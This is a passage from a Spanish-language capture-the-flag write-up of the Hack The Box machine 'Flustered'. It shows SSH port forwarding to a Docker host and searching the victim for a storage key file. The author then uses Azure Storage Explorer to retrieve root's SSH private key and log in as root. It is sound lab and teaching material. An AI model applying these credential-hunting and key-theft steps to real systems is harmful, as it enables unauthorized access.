</span></pre></table></code></div></div><p>Parece que si es http. Nos traemos el puerto 10000 de la maquina victima a la nuestra para escanearlo mejor. Esto lo hacemos con port forwarding a traves de ssh:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-L</span> 10000:172.17.0.2:10000 jennifer@10.10.11.131
</pre></table></code></div></div><p>En el anterior comando le estamos indicando que el puerto 10000 de la maquina victima (en este caso, el docker) sea nuestro puerto 10000 local.</p><p><img data-src="/assets/images/htb/flustered/docker.png" alt="docker" data-proofer-ignore></p><p>Nos muestra el codigo <code class="language-plaintext highlighter-rouge">InvalidQueryParameterValue</code>. Buscamos en internet que es, y vemos algo de Microsoft Azure. Hay un explorador de almacenamiento de azure, lo utilizaremos desde ubuntu ya que en Parrot OS da problemas.</p><p>Estando ya en ubuntu, nos instalamos lo siguiente:</p><ol><li>sudo apt install snapd<li>sudo snap install storage-explorer<li>storage-explorer &gt; Nos dara un error, le tenemos que dar clic a <code class="language-plaintext highlighter-rouge">copy command and quit</code> y pegamos el comando que nos ha copiado. Despues de esto volvemos a ejecutar <code class="language-plaintext highlighter-rouge">storage-explorer</code>.<li>En <code class="language-plaintext highlighter-rouge">Seleccionar recurso</code> seleccionamos <code class="language-plaintext highlighter-rouge">Emulador de almacenamiento local</code> y nos aparece lo siguiente:</ol><p><img data-src="/assets/images/htb/flustered/azure.png" alt="azure" data-proofer-ignore></p><p><strong>Nombre de la cuenta:</strong> jennifer</p><p><strong>Clave de cuenta:</strong> La encontramos ejecutando en la raiz de la maquina victima <code class="language-plaintext highlighter-rouge">find \-name key 2&gt;/dev/null</code> y nos reporta <code class="language-plaintext highlighter-rouge">/var/backups/key</code>.</p><p>Nos conectamos y vemos la clave privada de ssh del usuario root:</p><p><img data-src="/assets/images/htb/flustered/azure2.png" alt="azure2" data-proofer-ignore></p><p>Nos creamos un archivo llamado <code class="language-plaintext highlighter-rouge">id_rsa</code> en nuestro equipo con esa clave y le asignamos permisos <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> para realizar la conexion por ssh:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-i</span> id_rsa root@10.10.11.131
</pre></table></code></div></div><p>Visualizamos flag de root!!!</p><p class="notice--info"><strong>Exploits y contenido:</strong> En <a href="https://github.com/w0lfst/Ficheros-Writeups-HTB/tree/master/Flustered">mi github</a> encontraras el script autopwn.py y los archivos de reconocimiento.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/abusing-squid-proxy/" class="post-tag no-text-decoration" >Abusing Squid Proxy</a> <a href="/tags/abusing-glusterfs/" class="post-tag no-text-decoration" >Abusing GlusterFS</a> <a href="/tags/server-side-template-injection/" class="post-tag no-text-decoration" >Server Side Template Injection</a> <a href="/tags/abusing-azure-storage/" class="post-tag no-text-decoration" >Abusing Azure Storage</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Flustered - W0lfst&amp;url=/posts/flustered/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Flustered - W0lfst&amp;u=/posts/flustered/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=/posts/flustered/&amp;text=HTB - Flustered - W0lfst" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/abusing-azure-storage/">Abusing Azure Storage</a> <a class="post-tag" href="/tags/abusing-glusterfs/">Abusing GlusterFS</a> <a class="post-tag" href="/tags/abusing-seeddms/">Abusing SeedDMS</a> <a class="post-tag" href="/tags/abusing-squid-proxy/">Abusing Squid Proxy</a> <a class="post-tag" href="/tags/server-side-template-injection/">Server Side Template Injection</a> <a class="post-tag" href="/tags/snmp-code-execution/">SNMP Code Execution</a> <a class="post-tag" href="/tags/snmp-enumeration/">SNMP Enumeration</a> <a class="post-tag" href="/tags/sqli-error-based/">SQLi (error based)</a> <a class="post-tag" href="/tags/sqli-rce/">SQLi - rce</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/validation/"><div class="card-body"> <em class="timeago small" data-ts="1643842800" > 2022-02-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Validation</h3><div class="text-muted small"><p> Veremos las siguientes técnicas a lo largo de la resolución: SQLI (Error Based). SQLI - RCE (into outfile). Information Leakage. Reconocimiento Comprobacion conexion y TTL Realizamos ...</p></div></div></a></div><div class="card"> <a href="/posts/pit/"><div class="card-body"> <em class="timeago small" data-ts="1644361200" > 2022-02-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Pit</h3><div class="text-muted small"><p> Resolución detallada de la maquina Pit. Veremos las siguientes técnicas: Information leakage SNMP Enumeration Abusing SeedDMS SNMP Code Execution Reconocimiento. Comprobación conexión ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/pit/" class="btn btn-outline-primary" prompt="Anterior"><p>HTB - Pit</p></a> <span class="btn btn-outline-primary disabled" prompt="Nuevo"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/w0lfst_09">W0lfst</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/abusing-azure-storage/">Abusing Azure Storage</a> <a class="post-tag" href="/tags/abusing-glusterfs/">Abusing GlusterFS</a> <a class="post-tag" href="/tags/abusing-seeddms/">Abusing SeedDMS</a> <a class="post-tag" href="/tags/abusing-squid-proxy/">Abusing Squid Proxy</a> <a class="post-tag" href="/tags/server-side-template-injection/">Server Side Template Injection</a> <a class="post-tag" href="/tags/snmp-code-execution/">SNMP Code Execution</a> <a class="post-tag" href="/tags/snmp-enumeration/">SNMP Enumeration</a> <a class="post-tag" href="/tags/sqli-error-based/">SQLi (error based)</a> <a class="post-tag" href="/tags/sqli-rce/">SQLi - rce</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
